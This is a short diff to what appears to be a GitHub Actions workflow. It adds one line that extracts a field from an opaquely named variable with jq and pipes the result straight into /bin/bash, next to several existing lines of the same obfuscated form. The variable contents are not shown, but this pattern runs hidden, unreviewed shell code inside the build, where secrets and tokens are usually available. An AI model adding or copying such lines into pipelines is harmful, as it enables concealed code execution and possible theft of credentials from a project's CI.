@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$eaxbf7299" | jq -r .vcq89724 | /bin/bash
           echo $wl155 | jq -r .eng8 | /bin/bash
           echo $sjt071 | jq -r .nsmhd79100 | /bin/bash
+          printf '%s' "$g4" | jq -r .ovh976 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
